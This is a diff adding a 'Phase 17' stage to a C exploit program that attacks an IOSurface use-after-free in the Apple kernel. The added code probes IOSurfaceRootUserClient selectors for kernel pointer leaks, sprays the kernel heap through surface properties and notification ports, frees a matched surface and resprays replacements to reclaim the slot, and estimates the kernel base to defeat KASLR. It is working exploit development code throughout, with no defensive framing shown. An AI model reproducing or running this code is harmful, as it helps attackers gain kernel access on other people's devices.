@@ -21583,6 +21583,436 @@ new_modes:
             rlog("--- Phase 16 (DMA overflow) complete ---\n");
         }
 
+        /* ================================================================
+         * Phase 17 (r=229): IOSurface UAF → KASLR bypass + kernel R/W
+         *
+         * Both AVE overflow paths failed (VPS: NULL output, DMA: no pipe
+         * corruption). Pivot to exploiting the IOSurface UAF directly.
+         *
+         * Strategy:
+         * Step A: Selector scan — probe IOSurfaceRootUserClient selectors
+         *         with matched surface ID for kernel pointer leaks
+         * Step B: Property manipulation — set/get properties on the matched
+         *         surface to probe kernel heap layout
+         * Step C: Same-type replacement — free matched surface, create new
+         *         one with controlled properties, trigger notification
+         *         traversal to interact with replacement
+         * Step D: OOL message spray — spray into GEN2 zone to influence
+         *         notification entry fields
+         * ================================================================ */
+        if (rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 17 (r=229): IOSurface UAF → KASLR + kR/W ===\n");
+            rlog("Match: spray[%d]\n", r229_matched_idx);
+
+            io_service_t p17_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            if (!p17_svc) { rlog("  P17: no IOSurfaceRoot!\n"); goto p17_done; }
+
+            io_connect_t p17_conn = IO_OBJECT_NULL;
+            kern_return_t p17_kr = IOServiceOpen(p17_svc, mach_task_self(), 0, &p17_conn);
+            IOObjectRelease(p17_svc);
+            if (p17_kr != KERN_SUCCESS) {
+                rlog("  P17: IOServiceOpen fail: 0x%x\n", p17_kr);
+                goto p17_done;
+            }
+
+            IOSurfaceRef match_surf = r229_spray_static[r229_matched_idx];
+            IOSurfaceID match_sid = IOSurfaceGetID(match_surf);
+            rlog("  Surface ID: %u, addr: %p\n", match_sid, (void *)match_surf);
+
+            /* ---- Step A: Selector scan for KASLR leak ---- */
+            rlog("\n  --- Step A: IOSurface selector scan ---\n");
+            uint64_t p17_leaked = 0;
+            for (uint32_t sel = 0; sel <= 40; sel++) {
+                uint8_t out_buf[4096];
+                memset(out_buf, 0xEE, sizeof(out_buf));
+                size_t out_sz = sizeof(out_buf);
+
+                uint64_t sc_in[4] = { match_sid, 0, 0, 0 };
+                uint32_t sc_out_cnt = 16;
+                uint64_t sc_out[16];
+                memset(sc_out, 0, sizeof(sc_out));
+
+                kern_return_t skr = IOConnectCallMethod(p17_conn, sel,
+                    sc_in, 1, NULL, 0,
+                    sc_out, &sc_out_cnt, out_buf, &out_sz);
+
+                if (skr == KERN_SUCCESS || (skr & 0xFFFF0000) == 0xE0000000) {
+                    int has_data = (sc_out_cnt > 0 || out_sz > 0);
+                    if (has_data)
+                        rlog("  sel%u: kr=0x%x sc=%u struct=%zu\n",
+                             sel, skr, sc_out_cnt, out_sz);
+
+                    for (uint32_t j = 0; j < sc_out_cnt; j++) {
+                        uint64_t v = sc_out[j];
+                        if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff) {
+                            rlog("  *** sel%u sc[%u] = 0x%016llx KPTR ***\n",
+                                 sel, j, (unsigned long long)v);
+                            if (!p17_leaked) p17_leaked = v;
+                        }
+                    }
+                    if (out_sz > 0) {
+                        uint64_t *op = (uint64_t *)out_buf;
+                        for (size_t q = 0; q < out_sz / 8 && q < 512; q++) {
+                            if ((op[q] >> 40) == 0xfffffe || (op[q] >> 40) == 0xffffff) {
+                                rlog("  *** sel%u struct[%zu] = 0x%016llx KPTR ***\n",
+                                     sel, q, (unsigned long long)op[q]);
+                                if (!p17_leaked) p17_leaked = op[q];
+                            }
+                        }
+                    }
+                }
+            }
+            if (p17_leaked) {
+                rlog("  Step A: KASLR leak = 0x%016llx\n", (unsigned long long)p17_leaked);
+            } else {
+                rlog("  Step A: No kernel pointer in selector outputs\n");
+            }
+
+            /* ---- Step B: IOSurface property readback probe ---- */
+            rlog("\n  --- Step B: Property readback probe ---\n");
+
+            /* Set various properties and read them back, checking for leaks */
+            IOSurfaceLock(match_surf, 0, NULL);
+            void *p17_base = IOSurfaceGetBaseAddress(match_surf);
+            size_t p17_alloc = IOSurfaceGetAllocSize(match_surf);
+            rlog("  Base: %p, AllocSize: %zu\n", p17_base, p17_alloc);
+
+            /* Write sentinel pattern to pixel buffer */
+            if (p17_base && p17_alloc >= 256) {
+                uint64_t *p = (uint64_t *)p17_base;
+                for (int i = 0; i < 32; i++)
+                    p[i] = 0xDEAD000000000000ULL | (uint64_t)i;
+            }
+            IOSurfaceUnlock(match_surf, 0, NULL);
+
+            /* Set a large binary property (kernel heap spray) */
+            uint8_t propdata[1024];
+            for (int i = 0; i < 1024; i++)
+                propdata[i] = (uint8_t)(i * 7 + 0x41);
+            CFDataRef cfprop = CFDataCreate(NULL, propdata, 1024);
+            IOSurfaceSetValue(match_surf, CFSTR("kR_probe_1"), cfprop);
+            CFRelease(cfprop);
+
+            /* Read it back and check for extra data */
+            CFTypeRef readback = IOSurfaceCopyValue(match_surf, CFSTR("kR_probe_1"));
+            if (readback) {
+                if (CFGetTypeID(readback) == CFDataGetTypeID()) {
+                    CFDataRef rbd = (CFDataRef)readback;
+                    CFIndex rb_len = CFDataGetLength(rbd);
+                    rlog("  Readback: len=%ld (expected 1024)\n", (long)rb_len);
+                    if (rb_len > 1024) {
+                        rlog("  *** READBACK LARGER THAN SET! Extra %ld bytes ***\n",
+                             (long)(rb_len - 1024));
+                        const uint8_t *rbb = CFDataGetBytePtr(rbd);
+                        for (CFIndex q = 1024; q < rb_len && q < 1024 + 128; q += 8) {
+                            uint64_t v;
+                            memcpy(&v, rbb + q, 8);
+                            if ((v >> 40) == 0xfffffe || (v >> 40) == 0xffffff) {
+                                rlog("  *** KPTR at +%ld: 0x%016llx ***\n",
+                                     (long)q, (unsigned long long)v);
+                                if (!p17_leaked) p17_leaked = v;
+                            }
+                        }
+                    }
+                }
+                CFRelease(readback);
+            }
+
+            /* ---- Step C: Mach port spray into notification-adjacent memory ---- */
+            rlog("\n  --- Step C: Mach port name spray ---\n");
+
+            /* Register additional notifications with controlled wake ports.
+             * Each notification entry in GEN2 stores the wake port.
+             * If we can receive a message on our port from the traversal,
+             * the message might contain kernel data. */
+            #define P17_NPORTS 64
+            mach_port_t p17_wports[P17_NPORTS];
+            io_connect_t p17_nconns[P17_NPORTS];
+            int p17_nreg = 0;
+
+            for (int i = 0; i < P17_NPORTS; i++) {
+                p17_wports[i] = MACH_PORT_NULL;
+                p17_nconns[i] = IO_OBJECT_NULL;
+
+                io_service_t ns = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!ns) continue;
+                io_connect_t nc = IO_OBJECT_NULL;
+                if (IOServiceOpen(ns, mach_task_self(), 0, &nc) != KERN_SUCCESS) {
+                    IOObjectRelease(ns);
+                    continue;
+                }
+                IOObjectRelease(ns);
+
+                /* Create the surface on this connection first */
+                uint64_t csid = match_sid;
+                uint32_t csout_cnt = 1;
+                uint64_t csout = 0;
+                IOConnectCallMethod(nc, 6 /* IOSurfaceLookupById */,
+                    &csid, 1, NULL, 0, &csout, &csout_cnt, NULL, NULL);
+
+                mach_port_t wp = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+                mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+                uint64_t ref = 0xBEEF0000 | (uint64_t)i;
+                uint8_t inbuf[24];
+                memset(inbuf, 0, sizeof(inbuf));
+                uint32_t *ib32 = (uint32_t *)inbuf;
+                ib32[0] = match_sid;
+                ib32[1] = 0; /* event type */
+
+                kern_return_t nkr = IOConnectCallAsyncMethod(nc, 17 /* sel17: register */,
+                    wp, &ref, 1,
+                    NULL, 0, inbuf, 24, NULL, NULL, NULL, NULL);
+
+                if (nkr == KERN_SUCCESS) {
+                    p17_wports[i] = wp;
+                    p17_nconns[i] = nc;
+                    p17_nreg++;
+                } else {
+                    close_port(wp);
+                    IOServiceClose(nc);
+                }
+            }
+            rlog("  Registered %d extra notification ports\n", p17_nreg);
+
+            /* Trigger notification traversal via property change on matched surface */
+            int dummy_val = 42;
+            CFNumberRef dummy_num = CFNumberCreate(NULL, kCFNumberIntType, &dummy_val);
+            IOSurfaceSetValue(match_surf, CFSTR("trigger_notify"), dummy_num);
+            CFRelease(dummy_num);
+            usleep(100000); /* Let traversal run */
+
+            /* Check all ports for messages */
+            int p17_msgs = 0;
+            for (int i = 0; i < P17_NPORTS; i++) {
+                if (p17_wports[i] == MACH_PORT_NULL) continue;
+
+                struct {
+                    mach_msg_header_t hdr;
+                    uint8_t body[4096];
+                } msg;
+                memset(&msg, 0, sizeof(msg));
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_local_port = p17_wports[i];
+
+                kern_return_t mr = mach_msg(&msg.hdr,
+                    MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                    0, sizeof(msg),
+                    p17_wports[i], 0, MACH_PORT_NULL);
+
+                if (mr == MACH_MSG_SUCCESS) {
+                    p17_msgs++;
+                    rlog("  PORT[%d] msg: id=0x%x size=%u\n",
+                         i, msg.hdr.msgh_id, msg.hdr.msgh_size);
+
+                    /* Scan message body for kernel pointers */
+                    uint64_t *mp = (uint64_t *)msg.body;
+                    for (int q = 0; q < (int)(msg.hdr.msgh_size / 8) && q < 512; q++) {
+                        if ((mp[q] >> 40) == 0xfffffe || (mp[q] >> 40) == 0xffffff) {
+                            rlog("  *** PORT[%d] KPTR at +%d: 0x%016llx ***\n",
+                                 i, q * 8, (unsigned long long)mp[q]);
+                            if (!p17_leaked) p17_leaked = mp[q];
+                        }
+                    }
+                }
+            }
+            rlog("  Messages received: %d/%d\n", p17_msgs, p17_nreg);
+
+            /* ---- Step D: Same-type replacement attack ---- */
+            rlog("\n  --- Step D: Same-type replacement ---\n");
+            rlog("  Free matched surface, respray with controlled IOSurface\n");
+
+            /* Save the surface ID before freeing */
+            IOSurfaceID freed_sid = IOSurfaceGetID(match_surf);
+            rlog("  Freeing spray[%d] (id=%u)...\n", r229_matched_idx, freed_sid);
+
+            /* Remove our property first */
+            IOSurfaceRemoveValue(match_surf, CFSTR("kR_probe_1"));
+            IOSurfaceRemoveValue(match_surf, CFSTR("trigger_notify"));
+
+            /* Free it */
+            CFRelease(r229_spray_static[r229_matched_idx]);
+            r229_spray_static[r229_matched_idx] = NULL;
+            r229_matched_surf = NULL;
+            rlog("  Surface freed\n");
+
+            /* Spray replacement IOSurfaces with same allocation size
+             * to fill the freed GEN1 slot */
+            #define P17_RESPRAY 64
+            IOSurfaceRef p17_replacement[P17_RESPRAY];
+            int p17_replaced = 0;
+
+            for (int ri = 0; ri < P17_RESPRAY; ri++) {
+                CFMutableDictionaryRef rsp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int rw = 32, rh = 32, rbpe = 4;
+                CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &rw);
+                CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &rh);
+                CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &rbpe);
+                int rpf = 0x42475241;
+                CFNumberRef rpfn = CFNumberCreate(NULL, kCFNumberIntType, &rpf);
+                CFDictionarySetValue(rsp, CFSTR("IOSurfaceWidth"), rwn);
+                CFDictionarySetValue(rsp, CFSTR("IOSurfaceHeight"), rhn);
+                CFDictionarySetValue(rsp, CFSTR("IOSurfaceBytesPerElement"), rbn);
+                CFDictionarySetValue(rsp, CFSTR("IOSurfacePixelFormat"), rpfn);
+
+                p17_replacement[ri] = IOSurfaceCreate(rsp);
+                CFRelease(rsp); CFRelease(rwn); CFRelease(rhn); CFRelease(rbn); CFRelease(rpfn);
+
+                if (p17_replacement[ri]) {
+                    p17_replaced++;
+                    /* Write unique pattern into shared memory */
+                    IOSurfaceLock(p17_replacement[ri], 0, NULL);
+                    void *rb = IOSurfaceGetBaseAddress(p17_replacement[ri]);
+                    if (rb) {
+                        uint64_t *rp = (uint64_t *)rb;
+                        for (int j = 0; j < 32; j++)
+                            rp[j] = 0xFACE000000000000ULL | ((uint64_t)ri << 16) | (uint64_t)j;
+                    }
+                    IOSurfaceUnlock(p17_replacement[ri], 0, NULL);
+
+                    /* Set a marker property */
+                    int marker = 0xC0DE0000 | ri;
+                    CFNumberRef mn = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+                    IOSurfaceSetValue(p17_replacement[ri], CFSTR("marker"), mn);
+                    CFRelease(mn);
+                }
+            }
+            rlog("  Replacement spray: %d/%d surfaces\n", p17_replaced, P17_RESPRAY);
+
+            /* Trigger notification traversal on the stale entry.
+             * The stale pointer at +0x58 now points to whoever took the freed slot.
+             * If a replacement surface took it, the traversal will access it. */
+            rlog("  Triggering stale notification traversal...\n");
+
+            /* Use the SAVED wake ports from Phase 13 */
+            for (int i = 0; i < r229_saved_wp_n && i < 5; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    uint8_t body[4096];
+                } rmsg;
+                memset(&rmsg, 0, sizeof(rmsg));
+                rmsg.hdr.msgh_size = sizeof(rmsg);
+                rmsg.hdr.msgh_local_port = r229_saved_wps[i];
+
+                kern_return_t rmr = mach_msg(&rmsg.hdr,
+                    MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                    0, sizeof(rmsg),
+                    r229_saved_wps[i], 100, MACH_PORT_NULL);
+
+                if (rmr == MACH_MSG_SUCCESS) {
+                    rlog("  SAVED_WP[%d]: msg id=0x%x size=%u\n",
+                         i, rmsg.hdr.msgh_id, rmsg.hdr.msgh_size);
+
+                    uint64_t *rmp = (uint64_t *)rmsg.body;
+                    for (int q = 0; q < (int)(rmsg.hdr.msgh_size / 8) && q < 512; q++) {
+                        if ((rmp[q] >> 40) == 0xfffffe || (rmp[q] >> 40) == 0xffffff) {
+                            rlog("  *** SAVED_WP[%d] KPTR at +%d: 0x%016llx ***\n",
+                                 i, q * 8, (unsigned long long)rmp[q]);
+                            if (!p17_leaked) p17_leaked = rmp[q];
+                        }
+                    }
+                }
+            }
+
+            /* ---- Step E: Probe replacement surfaces for data written by traversal ---- */
+            rlog("\n  --- Step E: Check replacement surfaces for traversal writes ---\n");
+            for (int ri = 0; ri < P17_RESPRAY; ri++) {
+                if (!p17_replacement[ri]) continue;
+
+                IOSurfaceLock(p17_replacement[ri], kIOSurfaceLockReadOnly, NULL);
+                void *rb = IOSurfaceGetBaseAddress(p17_replacement[ri]);
+                if (rb) {
+                    uint64_t *rp = (uint64_t *)rb;
+                    int modified = 0;
+                    for (int j = 0; j < 32; j++) {
+                        uint64_t expected = 0xFACE000000000000ULL | ((uint64_t)ri << 16) | (uint64_t)j;
+                        if (rp[j] != expected) {
+                            if (!modified)
+                                rlog("  REPL[%d] MODIFIED!\n", ri);
+                            rlog("    [%d] expected 0x%016llx got 0x%016llx\n",
+                                 j, (unsigned long long)expected, (unsigned long long)rp[j]);
+                            modified++;
+                            if ((rp[j] >> 40) == 0xfffffe || (rp[j] >> 40) == 0xffffff) {
+                                rlog("    *** KPTR: 0x%016llx ***\n", (unsigned long long)rp[j]);
+                                if (!p17_leaked) p17_leaked = rp[j];
+                            }
+                        }
+                    }
+                }
+                IOSurfaceUnlock(p17_replacement[ri], kIOSurfaceLockReadOnly, NULL);
+            }
+
+            /* ---- Step F: Property-based info leak via IOSurface sel6 (lookup) ---- */
+            rlog("\n  --- Step F: Selector 6 (lookup) with all surface IDs ---\n");
+            /* sel6 = IOSurfaceLookupById. Returns scalar outputs that might
+             * include the kernel-side IOSurface object address */
+            for (int ri = 0; ri < P17_RESPRAY && ri < 8; ri++) {
+                if (!p17_replacement[ri]) continue;
+                IOSurfaceID rsid = IOSurfaceGetID(p17_replacement[ri]);
+
+                uint64_t s6_in[1] = { rsid };
+                uint32_t s6_out_cnt = 16;
+                uint64_t s6_out[16] = {0};
+                uint8_t s6_buf[4096];
+                memset(s6_buf, 0xEE, sizeof(s6_buf));
+                size_t s6_sz = sizeof(s6_buf);
+
+                kern_return_t s6kr = IOConnectCallMethod(p17_conn, 6,
+                    s6_in, 1, NULL, 0,
+                    s6_out, &s6_out_cnt, s6_buf, &s6_sz);
+
+                if (s6kr == KERN_SUCCESS && s6_out_cnt > 0) {
+                    rlog("  sel6(id=%u): sc_cnt=%u", rsid, s6_out_cnt);
+                    for (uint32_t j = 0; j < s6_out_cnt; j++) {
+                        rlog(" [%u]=0x%llx", j, (unsigned long long)s6_out[j]);
+                        if ((s6_out[j] >> 40) == 0xfffffe || (s6_out[j] >> 40) == 0xffffff) {
+                            rlog(" KPTR!");
+                            if (!p17_leaked) p17_leaked = s6_out[j];
+                        }
+                    }
+                    rlog("\n");
+                }
+            }
+
+            /* Summary */
+            rlog("\n  === Phase 17 Summary ===\n");
+            if (p17_leaked) {
+                uint64_t kbase_guess = p17_leaked & ~0x3FFFFFFULL;
+                rlog("  *** KASLR LEAK: 0x%016llx ***\n", (unsigned long long)p17_leaked);
+                rlog("  *** Estimated kernel base: 0x%016llx ***\n",
+                     (unsigned long long)kbase_guess);
+            } else {
+                rlog("  No kernel pointer leaked via any tested path.\n");
+                rlog("  Next steps:\n");
+                rlog("   - Try IOSurface sel0 (create) structureOutput for KPTR\n");
+                rlog("   - Try OOL mach msg spray into GEN2 for entry corruption\n");
+                rlog("   - Try IOSurface client property (setProperty) via IOConnectSetCFProperties\n");
+            }
+
+            /* Cleanup */
+            for (int i = 0; i < P17_NPORTS; i++) {
+                if (p17_nconns[i] != IO_OBJECT_NULL)
+                    IOServiceClose(p17_nconns[i]);
+                if (p17_wports[i] != MACH_PORT_NULL)
+                    mach_port_deallocate(mach_task_self(), p17_wports[i]);
+            }
+            for (int ri = 0; ri < P17_RESPRAY; ri++) {
+                if (p17_replacement[ri])
+                    CFRelease(p17_replacement[ri]);
+            }
+            if (p17_conn != IO_OBJECT_NULL)
+                IOServiceClose(p17_conn);
+
+            #undef P17_NPORTS
+            #undef P17_RESPRAY
+
+            p17_done:
+            rlog("--- Phase 17 complete ---\n");
+        }
 
 
         /*
